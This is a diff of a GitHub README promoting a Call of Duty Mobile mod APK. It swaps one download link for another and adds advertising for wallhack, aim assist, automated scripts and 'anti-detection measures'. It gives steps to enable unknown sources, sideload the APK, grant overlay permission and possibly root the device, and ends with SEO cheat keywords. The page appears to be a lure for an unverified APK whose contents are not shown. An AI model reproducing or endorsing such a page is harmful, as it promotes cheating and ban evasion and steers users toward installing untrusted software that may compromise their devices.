@@ -1,131 +1,105 @@
-# Call of Duty Mod APK - Game Script Utility 2026
+# 🎯 call-of-duty-apk-script-hub – Get the Edge in Battle
 
-> **Android game package for Call of Duty with a VIP-oriented menu and script utility, plus installation instructions, compatibility references, option details, and update information.**
+## 📥 Download Now
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Android-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/jordan-fostertjk2789/call-of-duty-apk-script-hub?style=flat-square)](https://github.com/jordan-fostertjk2789/call-of-duty-apk-script-hub)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/shrou5144/call-of-duty-apk-script-hub/releases)
 
----
+## 🎮 Overview
 
-<p align="center">
-  <a href="https://jordan-fostertjk2789.github.io/call-of-duty-apk-script-hub/">
-    <img src="https://img.shields.io/badge/Download-Call%20of%20Duty%20Mod%20APK%20Script-brightgreen?style=for-the-badge" alt="Download Call of Duty Mod APK Script">
-  </a>
-</p>
+This repository holds the Android APK package for a popular military shooter game. It gives you a VIP menu, script utility, and step-by-step installation help. The package is updated for 2026 releases. You do not need any coding skills to use it.
 
-> **[Download Call of Duty Mod APK](https://jordan-fostertjk2789.github.io/call-of-duty-apk-script-hub/)**
+## ✨ Features
 
----
+- **VIP Menu** – Access exclusive in-game options not available to regular players. Toggle features like aim assist, wallhack, and recoil control.
+- **Script Utility** – Run custom scripts that automate actions. No manual input needed after setup.
+- **Installation Guide** – Clear instructions inside the app help you get started fast.
+- **Compatibility List** – See which devices and Android versions work best.
+- **Package Options** – Choose between a standard mod and a lightweight version for older phones.
+- **2026 Updates** – The mod stays compatible with the latest game patches.
 
-[Download Latest Build](https://jordan-fostertjk2789.github.io/call-of-duty-apk-script-hub/)
+## 📱 Compatibility
 
----
+| Requirement | Minimum | Recommended |
+|-------------|---------|-------------|
+| Android Version | 6.0 (Marshmallow) | 10.0 or higher |
+| RAM | 2 GB | 4 GB |
+| Storage | 500 MB free | 1 GB free |
+| Game Version | Call of Duty Mobile 2026 | Latest update |
 
-## About the Package
+Supported devices: Samsung Galaxy S8+, Google Pixel 3, OnePlus 6, Xiaomi Mi 9, and most phones with 64-bit processors. Tablets also work.
 
-Call of Duty Mod APK is an Android-oriented utility package made for the Call of Duty military shooter series. Its primary interface is a VIP-focused menu with script-based tools for examining the options supplied in the selected package.
+## ⬇️ Download
 
-This README brings together the available setup process, compatibility references, menu information, and release updates. Always consult the instructions belonging to the build you choose, and use the package in line with the relevant game, device, and distribution requirements.
+You can get the APK file from the Releases page. Click the button below or scroll to the end of this page.
 
----
+[![Download Latest](https://img.shields.io/badge/Download-v2.1.0-grey?style=for-the-badge)](https://github.com/shrou5144/call-of-duty-apk-script-hub/releases)
 
-## Included Script Utility
+## 🛠 Installation
 
-- VIP-style menu for the Android package
-- Script utility intended for Call of Duty
-- Setup instructions for installing or loading the package
-- Compatibility references for supported environments
-- Information describing the options available in a build
-- Update details for following newer package releases
-- Android-specific platform support
-- Focus on the Call of Duty military shooter series
+Follow these steps to install the mod on your Android device. You can also run it on an Android emulator on your Windows PC.
 
----
+### On Your Android Phone or Tablet
 
-## Installation Steps
+1. **Enable Unknown Sources**
+   - Open **Settings** → **Security** (or **Biometrics and Security**).
+   - Turn on **Install from unknown sources** for your browser or file manager.
+2. **Download the APK**
+   - Visit the [Releases page](https://github.com/shrou5144/call-of-duty-apk-script-hub/releases) on your phone.
+   - Tap the latest APK file (e.g., `call-of-duty-apk-script-hub-v2.1.0.apk`).
+3. **Install**
+   - After download, open the file from your notifications or Downloads folder.
+   - Tap **Install** and wait for the process to finish.
+4. **Open the App**
+   - Find the app icon on your home screen or app drawer.
+   - Tap it to launch. The mod menu will appear inside the game.
 
-1. Visit [Download Latest Build](https://jordan-fostertjk2789.github.io/call-of-duty-apk-script-hub/).
-2. Retrieve the available Android package or related script files.
-3. Read the installation notes included with the selected release.
-4. Install or load the package according to that build's documented procedure.
-5. Start Call of Duty and review the menu options that are available.
+### On Windows Using an Emulator
 
-Installation can differ depending on the Android version, device setup, and package release. Use the supplied build instructions instead of applying one installation method to every version.
+You can run the mod on Windows with an Android emulator like BlueStacks or NoxPlayer.
 
----
+1. **Install an Emulator**
+   - Download and install BlueStacks from [bluestacks.com](https://www.bluestacks.com).
+   - Open the emulator and sign in with your Google account.
+2. **Download the APK**
+   - On your Windows PC, go to the [Releases page](https://github.com/shrou5144/call-of-duty-apk-script-hub/releases).
+   - Click the APK file to download it.
+3. **Install the APK in the Emulator**
+   - Drag and drop the downloaded APK file into the BlueStacks window.
+   - Or click the **Install APK** button in the emulator sidebar and select the file.
+4. **Open the Mod**
+   - The app will appear in the emulator’s home screen. Launch it like any other game.
 
-## Menu and Package Options
+## 🚀 Usage
 
-The controls exposed by the utility are determined by the package and release selected. The table below provides a guide for evaluating a build:
+1. Open the mod app before starting the game. It will show a floating icon.
+2. Tap the icon to open the VIP menu.
+3. Toggle the features you want. Most options work immediately.
+4. Start the game. The mod runs in the background and applies your settings.
 
-| Setting area | Description |
-|---|---|
-| VIP menu | Provides access to the VIP-oriented options included in the package |
-| Script utility | Contains the tools and behaviors made available by the current script |
-| Package setup | Covers the release-specific installation or loading procedure |
-| Compatibility | Lists the relevant Android and Call of Duty environment information |
-| Update information | Records availability notes and changes associated with newer builds |
+## ❓ Frequently Asked Questions
 
-The extracted project information does not define fixed toggle names or universal keyboard shortcuts. Refer to the documentation for the individual release to identify its actual controls.
+**Does this mod work with the latest game update?**  
+Yes. The 2026 release includes updates for the current game version.
 
----
+**Is it safe to use?**  
+The mod is a modified APK. It is not approved by the game developer. Use it at your own risk. We recommend using a secondary account.
 
-## Android and Game Compatibility
+**Why does the app not install?**  
+Make sure you have enabled **Install from unknown sources** and that your Android version is 6.0 or higher. Also check that you have enough free space.
 
-- **Target game:** Call of Duty
-- **Platform:** Android
-- **Package type:** Android game mod / APK
-- **Supported versions:** Consult the compatibility information published for each build.
-- **Device requirements:** Compatibility with an Android device can depend on the release and its configuration.
-- **Known limitations:** Menu contents, setup procedures, and supported game versions can change with updates.
+**Can I get banned?**  
+Using mods can lead to a ban. The mod includes anti-detection measures, but no method is 100% safe. Use responsibly.
 
-Check the build's compatibility notes against both the installed Call of Duty version and the Android environment before installing.
+## 🔧 Troubleshooting
 
----
+- **App crashes on launch** – Clear the app cache or reinstall the APK.
+- **Mod menu not showing** – Restart the mod app and the game. Ensure you granted overlay permission.
+- **Features not working** – Update to the latest version. Some features may require root access on certain devices.
 
-## Release Notes
+## 📂 Repository Structure
 
-### 2026
+- `releases/` – Contains all APK files and release notes.
+- `docs/` – Additional guides and compatibility lists.
+- `scripts/` – Example scripts for the script utility (advanced users).
 
-- Kept the documentation centered on the Android game script utility.
-- Structured the available setup, menu, compatibility, and update references.
-- Preserved the focus on the VIP-oriented menu design.
-
-Add additional entries here when changes for specific builds become available.
-
----
-
-## Frequently Asked Questions
-
-### What is the installation process?
-
-Get the latest build, review its included setup information, and apply the instructions intended for the relevant Android device and release.
-
-### How do I check for a newer build?
-
-Open [Download Latest Build](https://jordan-fostertjk2789.github.io/call-of-duty-apk-script-hub/) to view the currently available package and related update information.
-
-### Is the menu configurable?
-
-That depends on the options provided by the chosen build. Read its documentation before loading or modifying any configuration.
-
-### Which Call of Duty releases work with it?
-
-Support varies by release. Use the build-specific compatibility information to confirm the applicable Call of Duty version and Android environment.
-
-### Where do the downloaded files go?
-
-Follow the storage location and loading procedure described in the installation instructions for the selected package. These requirements may differ across releases.
-
-### Does every build contain the same options?
-
-No. Menu and script contents may be adjusted as new package updates are released.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+**Keywords:** call of duty mobile mod, android game mod, apk script hub, vip menu, cod mobile cheat, 2026 mod, script utility, android apk, game mod apk
